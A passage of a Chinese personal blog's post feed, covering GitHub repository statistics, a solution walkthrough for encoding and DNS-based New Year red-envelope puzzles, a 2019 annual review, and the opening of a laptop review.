noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 